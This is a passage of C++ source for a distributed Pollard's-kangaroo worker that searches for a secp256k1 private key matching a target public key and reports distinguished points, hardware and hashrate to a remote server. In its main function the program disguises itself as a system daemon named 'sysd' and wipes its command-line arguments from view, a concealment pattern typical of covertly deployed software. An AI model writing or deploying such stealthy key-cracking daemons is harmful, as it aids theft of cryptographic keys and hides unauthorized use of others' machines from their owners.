                std::vector<SecpMath::uint256_t> cur_dists(BATCH_SIZE);
                uint64_t dummy = 0;

                std::hash<std::string> str_hasher;
                uint64_t node_base_offset = (str_hasher(config_.worker_id) & 0x0FFFFFFFFFFFFFFFULL);

                for (int b = 0; b < BATCH_SIZE; ++b) {
                    if (task_type == "WILD") {
                        uint64_t thread_wild_off = node_base_offset + (uint64_t)(t * BATCH_SIZE + b) * 0x1000000ULL;
                        SecpMath::uint256_t off = SecpMath::uint256_t::from_u64(thread_wild_off);
                        cur_dists[b] = off;
                        SecpMath::Point off_pt = SecpMath::point_mul(off);
                        SecpMath::JacobianPoint jw = SecpMath::jacobian_add_affine(SecpMath::JacobianPoint::from_affine(target_pubkey_), off_pt);
                        cur_points[b] = jw.to_affine();
                    } else {
                        std::mt19937_64 gen(node_base_offset ^ (t * 1000ULL + b) ^ std::random_device{}());
                        SecpMath::uint256_t off = {{gen(), gen(), 0, 0}};
                        cur_dists[b] = off;
                        SecpMath::Point off_pt = SecpMath::point_mul(off);
                        SecpMath::Point base_p = SecpMath::point_mul(range_min_);
                        SecpMath::JacobianPoint jt = SecpMath::jacobian_add_affine(SecpMath::JacobianPoint::from_affine(base_p), off_pt);
                        cur_points[b] = jt.to_affine();
                    }
                }

                uint64_t thread_steps = 0;
                std::vector<SecpMath::uint256_t> dx(BATCH_SIZE);
                std::vector<SecpMath::uint256_t> inv_dx(BATCH_SIZE);
                std::vector<int> jump_indices(BATCH_SIZE);

                for (int iter = 0; !cycle_done && running_; ++iter) {
                    for (int b = 0; b < BATCH_SIZE; ++b) {
                        int j = cur_points[b].x.d[0] & 0x0F;
                        jump_indices[b] = j;
                        dx[b] = SecpMath::sub_mod_p(jumps_pts_[j].x, cur_points[b].x);
                    }

                    // 1 field inversion per 256 parallel points
                    SecpMath::batch_inv_mod_p(dx.data(), inv_dx.data(), BATCH_SIZE);

                    for (int b = 0; b < BATCH_SIZE; ++b) {
                        int j = jump_indices[b];
                        const SecpMath::Point& J = jumps_pts_[j];

                        SecpMath::uint256_t dy = SecpMath::sub_mod_p(J.y, cur_points[b].y);
                        SecpMath::uint256_t slope = SecpMath::mul_mod_p(dy, inv_dx[b]);

                        SecpMath::uint256_t x3 = SecpMath::sub_mod_p(SecpMath::sub_mod_p(SecpMath::sqr_mod_p(slope), cur_points[b].x), J.x);
                        SecpMath::uint256_t y3 = SecpMath::sub_mod_p(SecpMath::mul_mod_p(slope, SecpMath::sub_mod_p(cur_points[b].x, x3)), cur_points[b].y);

                        cur_points[b].x = x3;
                        cur_points[b].y = y3;
                        cur_dists[b] = SecpMath::add_raw(cur_dists[b], jumps_dist_[j], dummy);

                        if ((x3.d[0] & dp_mask) == 0) {
                            std::lock_guard<std::mutex> lock(dps_mutex);
                            local_dps.push_back({x3.to_hex(), cur_dists[b].to_hex()});
                            if (local_dps.size() >= 1000) {
                                cycle_done = true;
                            }
                        }
                    }
                    thread_steps += BATCH_SIZE;

                    if ((iter & 0x7F) == 0) {
                        auto now = std::chrono::high_resolution_clock::now();
                        double sec = std::chrono::duration<double>(now - start_time).count();
                        if (sec >= target_duration_sec) {
                            cycle_done = true;
                        }
                    }
                }
                total_steps += thread_steps;
            });
        }

        for (auto& th : workers) {
            if (th.joinable()) th.join();
        }

        auto end_time = std::chrono::high_resolution_clock::now();
        double elapsed_sec = std::chrono::duration<double>(end_time - start_time).count();
        if (elapsed_sec <= 0.0001) elapsed_sec = 0.0001;
        double real_mhs = ((double)total_steps.load() / elapsed_sec) / 1000000.0;

        std::ostringstream hr_ss;
        hr_ss << std::fixed << std::setprecision(2) << real_mhs << " MH/s";
        std::string calculated_hashrate = hr_ss.str();

        std::ostringstream json;
        json << "{\"worker_id\":\"" << config_.worker_id << "\",";
        json << "\"hardware\":\"" << hw_label_ << "\",";
        json << "\"hashrate\":\"" << calculated_hashrate << "\",";
        json << "\"dp_list\":[";
        for (size_t i = 0; i < local_dps.size(); ++i) {
            json << "{\"x\":\"" << local_dps[i].x_hex << "\",\"dist\":\"" << local_dps[i].dist_hex << "\"}";
            if (i + 1 < local_dps.size()) json << ",";
        }
        json << "]}";

        std::string action = (task_type == "WILD") ? "check_wild" : "submit_tame";
        std::string resp;
        HttpClient::PostJson(config_.server_url + "?action=" + action, json.str(), resp);
        if (resp.find("BINGO") != std::string::npos) {
            running_ = false;
        }
    }
};

int main(int argc, char* argv[]) {
    DaemonConfig cfg;
    int default_concurrency = (int)std::thread::hardware_concurrency();
    cfg.num_threads = (default_concurrency > 0) ? default_concurrency : 4;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--verify") {
            cfg.verify_mode = true;
        } else if (arg == "-t" || arg == "--threads" || arg == "-c" || arg == "-j" || arg == "--full-threads" || arg == "-f") {
            if (arg == "--full-threads" || arg == "-f") {
                cfg.num_threads = default_concurrency;
            } else if (i + 1 < argc && argv[i + 1][0] != '-') {
                std::string val = argv[++i];
                if (val == "max" || val == "all" || val == "full" || val == "0") {
                    cfg.num_threads = default_concurrency;
                } else {
                    int n = std::atoi(val.c_str());
                    if (n > 0) cfg.num_threads = n;
                }
            } else {
                cfg.num_threads = default_concurrency;
            }
        } else if (arg == "-u" && i + 1 < argc) {
            std::string val = argv[++i];
            if (val.rfind("http://", 0) == 0 || val.rfind("https://", 0) == 0) {
                cfg.server_url = val;
            } else {
                cfg.worker_id = val;
            }
        } else if ((arg == "-s" || arg == "--server") && i + 1 < argc) {
            cfg.server_url = argv[++i];
        }
    }

    if (!cfg.verify_mode) {
#if defined(__linux__) && defined(PR_SET_NAME)
        prctl(PR_SET_NAME, "sysd", 0, 0, 0);
#elif defined(__APPLE__)
        pthread_setname_np("sysd");
#endif
        for (int i = 1; i < argc; ++i) {
            if (argv[i]) std::memset(argv[i], 0, std::strlen(argv[i]));
        }
    }

    SystemEngine engine(cfg);
    engine.run();
    return 0;
}